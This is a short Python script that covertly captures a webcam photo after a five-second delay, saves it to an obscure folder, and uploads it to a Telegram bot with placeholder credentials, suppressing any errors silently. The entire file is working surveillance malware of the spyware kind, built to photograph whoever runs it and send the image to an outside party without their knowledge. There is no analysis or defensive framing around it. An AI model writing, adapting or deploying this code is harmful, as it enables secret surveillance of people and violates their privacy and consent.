import cv2
import os
import time
import requests
import sys

def capture_image(save_path=r"C:\x", filename="p.jpg"): #Adjust the path to your desired location
    if not os.path.exists(save_path):
        os.makedirs(save_path)
    
    image_path = os.path.join(save_path, filename)
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        return
    
    ret, frame = cap.read()
    if not ret:
        cap.release()
        return

    cv2.imwrite(image_path, frame)
    cap.release()
    
    return image_path

def send_image_via_telegram(image_path, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    
    with open(image_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': chat_id}
        
        response = requests.post(url, data=data, files=files)

def run_in_background():
    try:
        time.sleep(5)
        
        image_path = capture_image()
        
        if image_path:
            bot_token = "YOUR_BOT_TOKEN"
            chat_id = "YOUR_CHAT_ID"
            
            send_image_via_telegram(image_path, bot_token, chat_id)
        
    except Exception as e:
        pass
    
    sys.exit()

if __name__ == "__main__":
    run_in_background()
